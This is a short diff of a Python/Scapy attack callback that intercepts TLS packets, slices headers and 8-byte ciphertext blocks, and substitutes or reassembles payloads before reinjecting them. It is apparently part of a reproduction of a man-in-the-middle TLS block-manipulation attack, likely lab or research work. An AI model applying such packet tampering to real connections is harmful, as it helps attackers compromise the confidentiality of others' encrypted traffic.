@@ -232,11 +232,10 @@ def attack_callback(packet):
             print("packet_count", packet_count)
             last_byte_of_the_penultimate_block += 1
             current_packet_tls_header = bytes(pkt.getlayer('TLS'))[:29]
-            current_packet_tls_payload = bytes(pkt.getlayer('TLS'))[5:]
+            current_packet_tls_payload = bytes(pkt.getlayer('TLS'))[29:]
 
             print(len(bytes(pkt.getlayer('TLS')))-29)
 
-            # ブロックサイズ（例: 8バイト固定）
             block_size = 8
 
             # 真ん中のブロックを切り出し
@@ -257,6 +256,14 @@ def attack_callback(packet):
             # 新しいペイロードを作成
             # new_payload = current_packet_tls_header + current_packet_tls_payload_modified
             new_payload = current_packet_tls_header + previous_packet_tls_payload
+
+            current_packet_first_application_data = bytes(
+                pkt.getlayer('TLS'))[:29]
+            current_packet_second_application_data_tls_header = bytes(pkt.getlayer('TLS'))[
+                29:34]
+            current_packet_second_application_data_tls_payload = bytes(pkt.getlayer('TLS'))[34:]
+
+            new_payload = current_packet_first_application_data + current_packet_second_application_data_tls_header + current_packet_second_application_data_tls_payload
 
             pkt[TCP].remove_payload()
             pkt[TCP].add_payload(new_payload)
